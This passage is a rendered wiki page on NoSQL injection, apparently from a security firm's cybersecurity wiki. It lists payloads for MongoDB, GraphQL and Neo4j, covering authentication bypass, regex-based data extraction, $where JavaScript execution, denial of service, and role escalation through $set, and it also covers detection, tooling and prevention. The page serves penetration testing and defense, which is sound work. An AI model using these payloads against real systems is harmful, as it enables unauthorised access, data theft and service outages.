+{&#34;$where&#34;: &#34;this.password[0]==&#39;a&#39;&#34;}                         // Extract character
+{&#34;$where&#34;: &#34;this.password.length==8&#34;}                       // Length check
+</code></pre><h3 id="json-injection">
+  JSON Injection
+  <a class="anchor" href="#json-injection">#</a>
+</h3>
+<pre tabindex="0"><code>&#34;, &#34;password&#34;: {&#34;$ne&#34;: null}, &#34;x&#34;: &#34;                        // Inject operator
+&#34;, &#34;$or&#34;: [{&#34;admin&#34;: true}, {&#34;x&#34;: &#34;                         // Inject OR logic
+</code></pre><h3 id="detection">
+  Detection
+  <a class="anchor" href="#detection">#</a>
+</h3>
+<pre tabindex="0"><code>&#39; || 1==1//                                                  // Should succeed
+&#39; &amp;&amp; 0==1//                                                  // Should fail
+&#39; || sleep(5000)//                                           // Time delay
+</code></pre><hr>
+<h2 id="exploitation--bypassing-defenses">
+  Exploitation &amp; Bypassing defenses
+  <a class="anchor" href="#exploitation--bypassing-defenses">#</a>
+</h2>
+<h3 id="1-authentication-bypass">
+  1. Authentication Bypass
+  <a class="anchor" href="#1-authentication-bypass">#</a>
+</h3>
+<p><strong>Use Cases</strong>: Login without valid credentials.</p>
+<p><strong>Test Cases / Payloads</strong>:</p>
+<ul>
+<li>
+<p>HTTP data</p>
+<pre tabindex="0"><code>username[$ne]=toto&amp;password[$ne]=toto
+login[$regex]=a.*&amp;pass[$ne]=lol
+login[$gt]=admin&amp;login[$lt]=test&amp;pass[$ne]=1
+login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
+</code></pre></li>
+<li>
+<p>JSON data</p>
+<pre tabindex="0"><code>{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}
+{&#34;username&#34;: {&#34;$ne&#34;: &#34;foo&#34;}, &#34;password&#34;: {&#34;$ne&#34;: &#34;bar&#34;}}
+{&#34;username&#34;: {&#34;$gt&#34;: undefined}, &#34;password&#34;: {&#34;$gt&#34;: undefined}}
+{&#34;username&#34;: {&#34;$gt&#34;:&#34;&#34;}, &#34;password&#34;: {&#34;$gt&#34;:&#34;&#34;}}
+{&#34;username&#34;: {&#34;$exists&#34;: true}, &#34;password&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}
+{&#34;$or&#34;: [{&#34;user&#34;: &#34;admin&#34;}, {&#34;user&#34;: {&#34;$ne&#34;: null}}]}
+</code></pre></li>
+</ul>
+<hr>
+<h3 id="2-data-extraction">
+  2. Data Extraction
+  <a class="anchor" href="#2-data-extraction">#</a>
+</h3>
+<p><strong>Blind via Regex Bruteforce</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a&#34;</span>}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^admin.*@example\\\\.com&#34;</span>}}
+</span></span></code></pre></div><p><strong>Error-Based / Full Dump</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;user&#34;</span>: {<span style="color:#f92672">&#34;$gt&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}     <span style="color:#75715e">// Returns all users
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;age&#34;</span>: {<span style="color:#f92672">&#34;$lt&#34;</span>: <span style="color:#ae81ff">150</span>}}     <span style="color:#75715e">// Type probing
+</span></span></span></code></pre></div><hr>
+<h3 id="3-privilege-escalation">
+  3. Privilege Escalation
+  <a class="anchor" href="#3-privilege-escalation">#</a>
+</h3>
+<p><strong>Elevating User Roles or Creating Admins</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;attacker&#34;</span>, <span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}        <span style="color:#75715e">// MongoDB operator injection - updates role to admin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;hacker&#34;</span>, <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;backdoor&#34;</span>}  <span style="color:#75715e">// Direct privilege escalation - creates admin user with known password
+</span></span></span></code></pre></div><hr>
+<h3 id="4-denial-of-service-dos">
+  4. Denial of Service (DoS)
+  <a class="anchor" href="#4-denial-of-service-dos">#</a>
+</h3>
+<p><strong>CPU / Infinite Loop</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;while(true){}&#34;</span>}  <span style="color:#75715e">// MongoDB
+</span></span></span></code></pre></div><p><strong>Memory Exhaustion</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#960050;background-color:#1e0010">...</span>,<span style="color:#ae81ff">100000</span>]}}  <span style="color:#75715e">// Massive $in array
+</span></span></span></code></pre></div><hr>
+<h3 id="5-remote-code-execution-rce">
+  5. Remote Code Execution (RCE)
+  <a class="anchor" href="#5-remote-code-execution-rce">#</a>
+</h3>
+<p>MongoDB Server-Side JavaScript Injection: Exploits $where operator which executes JavaScript on MongoDB server</p>
+<pre tabindex="0"><code>{&#34;$where&#34;: &#34;sleep(10000)&#34;}    // Time-based: 10 second delay confirms execution
+{&#34;$where&#34;: &#34;this.username == &#39;admin&#39; &amp;&amp; this.password.match(/.*/)&#34;}  // Boolean-based: extracts data via regex
+{&#34;$where&#34;: &#34;var date = new Date(); while(new Date() - date &lt; 5000){}&#34;}  // CPU-based time delay (5 seconds)
+</code></pre><p>Note: $where is deprecated in modern MongoDB versions but still found in legacy systems.</p>
+<hr>
+<h3 id="6-schema-manipulation--tampering">
+  6. Schema Manipulation &amp; Tampering
+  <a class="anchor" href="#6-schema-manipulation--tampering">#</a>
+</h3>
+<p><strong>Inject/Remove Fields</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;victim&#34;</span>, <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">true</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$unset&#34;</span>: {<span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}  <span style="color:#75715e">// Deletes password field
+</span></span></span></code></pre></div><hr>
+<h2 id="advance-attack-scenarios">
+  Advance Attack Scenarios
+  <a class="anchor" href="#advance-attack-scenarios">#</a>
+</h2>
+<h3 id="1-second-order-nosql-injection">
+  1. Second-Order NoSQL Injection
+  <a class="anchor" href="#1-second-order-nosql-injection">#</a>
+</h3>
+<p>Input is stored safely but injected into a query later when retrieved:</p>
+<ol>
+<li>Register a user with username: <code>{&quot;$gt&quot;: &quot;&quot;}</code> (stored as-is in the DB).</li>
+<li>Later, when the app queries: <code>db.users.find({username: &lt;stored_value&gt;})</code> — the stored operator activates.</li>
+</ol>
+<h3 id="2-mongodb-aggregation-pipeline-injection">
+  2. MongoDB Aggregation Pipeline Injection
+  <a class="anchor" href="#2-mongodb-aggregation-pipeline-injection">#</a>
+</h3>
+<p>If user input is embedded in a <code>$match</code> stage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">db.collection.aggregate(</span>[
+</span></span><span style="display:flex;"><span>  { <span style="color:#f92672">&#34;$match&#34;</span>: { <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;&lt;USER_INPUT&gt;&#34;</span> } }
+</span></span><span style="display:flex;"><span>]<span style="color:#960050;background-color:#1e0010">)</span>
+</span></span></code></pre></div><p><strong>Payload:</strong> <code>{&quot;$ne&quot;: &quot;user&quot;}</code> → returns all non-user records.</p>
+<h3 id="3-graphql--mongodb-injection">
+  3. GraphQL + MongoDB Injection
+  <a class="anchor" href="#3-graphql--mongodb-injection">#</a>
+</h3>
+<p>GraphQL resolvers that pass arguments directly to MongoDB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user</span>(filter: <span style="color:#e6db74">&#34;{\&#34;role\&#34;:{\&#34;$ne\&#34;:\&#34;user\&#34;}}&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> email role
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="4-neo4j-database-graph-oriented-database">
+  4. Neo4j Database (graph-oriented database)
+  <a class="anchor" href="#4-neo4j-database-graph-oriented-database">#</a>
+</h3>
+<p><strong>Cypher Injections</strong></p>
+<p><code>query = f&quot;MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower('{name}') RETURN m.title</code> AS title”</p>
+<p>For returning all records: // Check the below query, is ** the part of this query.</p>
+<p><code>query = f&quot;MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower**('test') or 1=1 return m.title AS title**// RETURN m.title AS title&quot;</code></p>
+<p>Payload: <strong>test&rsquo;) or 1=1 return m.title AS title//</strong></p>
+<h2 id="payload-repository">
+  Payload Repository
+  <a class="anchor" href="#payload-repository">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">// Fuzz Strings
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%00
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#34;</span> <span style="color:#960050;background-color:#1e0010">\\</span> <span style="color:#960050;background-color:#1e0010">;</span> { }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Auth Bypass
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;username&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}, <span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$or&#34;</span>: [{<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}, {<span style="color:#f92672">&#34;role&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>}}]}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Regex Brute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a.*&#34;</span>}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^.{8,}$&#34;</span>}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Time Based
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;sleep(5000)&#34;</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;function() { return true; }&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Extracting Data with time delays
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;$where&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;if(this.token.startsWith(&#39;a&#39;)) {sleep(5000); return true;} else {return true;}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// DoS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#960050;background-color:#1e0010">...</span><span style="color:#ae81ff">10000</span>]}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Schema Abuse
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$unset&#34;</span>: {<span style="color:#f92672">&#34;2FA&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Javascript Execution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$where:</span> <span style="color:#960050;background-color:#1e0010">function()</span> { <span style="color:#75715e">//arbitrary JavaScript here }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&#34;$where&#34;</span>:<span style="color:#e6db74">&#34;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&#34;</span>  <span style="color:#75715e">// Extracting field names
+</span></span></span></code></pre></div><hr>
+<h2 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Payload</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Auth bypass (URL-encoded)</td>
+<td><code>username[$ne]=x&amp;password[$ne]=x</code></td>
+<td>Login succeeds without valid credentials</td>
+</tr>
+<tr>
+<td>Auth bypass (JSON)</td>
+<td><code>{&quot;username&quot;:{&quot;$ne&quot;:null},&quot;password&quot;:{&quot;$ne&quot;:null}}</code></td>
+<td>Login succeeds</td>
+</tr>
+<tr>
+<td>OR logic bypass</td>
+<td><code>{&quot;$or&quot;:[{&quot;user&quot;:&quot;admin&quot;},{&quot;user&quot;:{&quot;$ne&quot;:null}}]}</code></td>
+<td>Returns admin user or all users</td>
+</tr>
+<tr>
+<td>Regex enumeration</td>
+<td><code>{&quot;email&quot;:{&quot;$regex&quot;:&quot;^a&quot;}}</code></td>
+<td>Response differs if field starts with &lsquo;a&rsquo;</td>
+</tr>
+<tr>
+<td>Time-based blind</td>
+<td><code>{&quot;$where&quot;:&quot;sleep(5000)&quot;}</code></td>
+<td>~5 second delay in response</td>
+</tr>
+<tr>
+<td>Field existence probe</td>
+<td><code>{&quot;SSN&quot;:{&quot;$exists&quot;:true}}</code></td>
+<td>Returns records that have SSN field</td>
+</tr>
+<tr>
+<td>DoS via large <code>$in</code></td>
+<td><code>{&quot;id&quot;:{&quot;$in&quot;:[1,2,...,100000]}}</code></td>
+<td>Server slowdown or timeout</td>
+</tr>
+<tr>
+<td>Schema tampering</td>
+<td><code>{&quot;$set&quot;:{&quot;role&quot;:&quot;admin&quot;}}</code></td>
+<td>User role elevated if update endpoint vulnerable</td>
+</tr>
+<tr>
+<td>Neo4j Cypher injection</td>
+<td><code>test') or 1=1 return m.title AS title//</code></td>
+<td>All records returned</td>
+</tr>
+<tr>
+<td>Regex length probe</td>
+<td><code>{&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{8}$&quot;}}</code></td>
+<td>Confirms password length = 8</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-techniques">
+  Detection Techniques
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<h3 id="a-manual-detection">
+  A. Manual Detection
+  <a class="anchor" href="#a-manual-detection">#</a>
+</h3>
+<ol>
+<li><strong>Character fuzzing</strong> — Send <code>'</code>, <code>&quot;</code>, <code>{</code>, <code>}</code>, <code>;</code>, <code>$</code>, <code>\x00</code> in all input fields and observe errors, behavior changes, or timing differences.</li>
+<li><strong>Operator injection</strong> — Change <code>username=admin</code> to <code>username[$ne]=admin</code> in URL-encoded POST body. If login succeeds, injection is possible.</li>
+<li><strong>JSON operator injection</strong> — If API accepts JSON, replace <code>&quot;password&quot;: &quot;test&quot;</code> with <code>&quot;password&quot;: {&quot;$ne&quot;: null}</code>. Successful login = vulnerable.</li>
+<li><strong>Boolean test</strong> — Send <code>' || 1==1//</code> (should succeed) and <code>' &amp;&amp; 0==1//</code> (should fail). Differing responses confirm injection.</li>
+<li><strong>Time-based blind</strong> — Send <code>{&quot;$where&quot;: &quot;sleep(5000)&quot;}</code> and observe if response takes ~5 seconds.</li>
+<li><strong>Regex brute-force</strong> — Test <code>{&quot;field&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}</code>, <code>{&quot;field&quot;: {&quot;$regex&quot;: &quot;^b&quot;}}</code> etc. to enumerate field values one character at a time.</li>
+</ol>
+<h3 id="b-automated-tools">
+  B. Automated Tools
+  <a class="anchor" href="#b-automated-tools">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>NoSQLMap</strong></td>
+<td>Automated detection and exploitation of NoSQLi across MongoDB, CouchDB</td>
+</tr>
+<tr>
+<td><strong>Burp Suite</strong> (Intruder, Turbo Intruder)</td>
+<td>Fuzz operator payloads, brute-force regex enumeration</td>
+</tr>
+<tr>
+<td><strong>OWASP ZAP</strong></td>
+<td>Active scanning with NoSQLi passive and active rules</td>
+</tr>
+<tr>
+<td><strong>Nuclei</strong></td>
+<td>Templates for known NoSQLi CVEs and common patterns</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Authentication Bypass</strong> — Log in without valid credentials using <code>$ne</code>, <code>$gt</code>, <code>$regex</code>.</li>
+<li><strong>Data Exfiltration</strong> — Dump all records or enumerate field values character by character via regex.</li>
+<li><strong>Privilege Escalation</strong> — Inject <code>$set: {&quot;role&quot;: &quot;admin&quot;}</code> to elevate account permissions.</li>
+<li><strong>Denial of Service</strong> — Infinite loops via <code>$where: &quot;while(true){}&quot;</code> or massive <code>$in</code> arrays crash the DB.</li>
+<li><strong>Remote Code Execution</strong> — <code>$where</code> JavaScript execution on legacy MongoDB enables server-side RCE.</li>
+<li><strong>Schema Tampering</strong> — Delete or modify fields (<code>$unset</code>, <code>$set</code>) to remove 2FA, alter roles.</li>
+<li><strong>Information Disclosure</strong> — Reveal hidden fields, schema structure, or database metadata.</li>
+</ul>
+<h2 id="prevention--mitigation">
+  Prevention &amp; Mitigation
+  <a class="anchor" href="#prevention--mitigation">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Input Validation</td>
+<td>Block <code>$</code>, <code>{}</code>, <code>[</code>, <code>;</code>, and operators in input</td>
+</tr>
+<tr>
+<td><strong>Parameterization</strong></td>
+<td>Use driver-native query building (e.g. <code>find({})</code>)</td>
+</tr>
+<tr>
+<td><strong>Disable JS in DB</strong></td>
+<td>MongoDB: <code>--noscripting</code> or restrict <code>$where</code> operator</td>
+</tr>
+<tr>
+<td><strong>Access Control</strong></td>
+<td>Use DB roles with principle of least privilege</td>
+</tr>
+<tr>
+<td><strong>Web Application Firewall (WAF)</strong></td>
+<td>Block typical operator strings in input</td>
+</tr>
+<tr>
+<td><strong>Logging &amp; Monitoring</strong></td>
+<td>Alert on operator patterns or repeated regex use</td>
+</tr>
+<tr>
+<td><strong>Sanitization Libraries</strong></td>
+<td>Use libraries like <code>mongo-sanitize</code> (Node.js)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<ul>
+<li><strong>HackerOne Hacktivity</strong> —
+<ul>
+<li><a href="https://hackerone.com/reports/1130874" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1130874</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/1458020" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1458020</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/1130721" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1130721</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</li>
+<li><strong>PortSwigger Web Security Academy</strong> — NoSQL injection lab track.</li>
+<li><strong>Bugcrowd VRT</strong> — Injection &gt; NoSQL Injection for severity context.</li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<p><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/nosql-injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/" target="_blank" rel="noreferrer noopener nofollow">https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities" target="_blank" rel="noreferrer noopener nofollow">https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@srkasthuri/hacking-apps-using-nosql-injections-2ac6195bed2e" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@srkasthuri/hacking-apps-using-nosql-injections-2ac6195bed2e</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://payatu.com/blog/nosql-injection/" target="_blank" rel="noreferrer noopener nofollow">https://payatu.com/blog/nosql-injection/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQI%20Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/NoSQL%20Injection.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#nosql-injection">NoSQL Injection</a>
+      <ul>
+        <li><a href="#nosql-injection-fundamentals">NoSQL Injection Fundamentals</a>
+          <ul>
+            <li><a href="#what-is-nosqli">What is NoSQLi?</a></li>
+            <li><a href="#sqli-vs-nosqli">SQLi vs NoSQLi</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#operator-based-injection">Operator-Based Injection</a></li>
+        <li><a href="#syntax-injection"><strong>Syntax Injection</strong></a>
+          <ul>
+            <li><a href="#string-context-break">String Context Break</a></li>
+            <li><a href="#javascript-injection-where">JavaScript Injection ($where)</a></li>
+            <li><a href="#json-injection">JSON Injection</a></li>
+            <li><a href="#detection">Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation--bypassing-defenses">Exploitation &amp; Bypassing defenses</a>
+          <ul>
+            <li><a href="#1-authentication-bypass">1. Authentication Bypass</a></li>
+            <li><a href="#2-data-extraction">2. Data Extraction</a></li>
+            <li><a href="#3-privilege-escalation">3. Privilege Escalation</a></li>
+            <li><a href="#4-denial-of-service-dos">4. Denial of Service (DoS)</a></li>
+            <li><a href="#5-remote-code-execution-rce">5. Remote Code Execution (RCE)</a></li>
+            <li><a href="#6-schema-manipulation--tampering">6. Schema Manipulation &amp; Tampering</a></li>
+          </ul>
+        </li>
+        <li><a href="#advance-attack-scenarios">Advance Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-second-order-nosql-injection">1. Second-Order NoSQL Injection</a></li>
+            <li><a href="#2-mongodb-aggregation-pipeline-injection">2. MongoDB Aggregation Pipeline Injection</a></li>
+            <li><a href="#3-graphql--mongodb-injection">3. GraphQL + MongoDB Injection</a></li>
+            <li><a href="#4-neo4j-database-graph-oriented-database">4. Neo4j Database (graph-oriented database)</a></li>
+          </ul>
+        </li>
+        <li><a href="#payload-repository">Payload Repository</a></li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#a-manual-detection">A. Manual Detection</a></li>
+            <li><a href="#b-automated-tools">B. Automated Tools</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention--mitigation">Prevention &amp; Mitigation</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
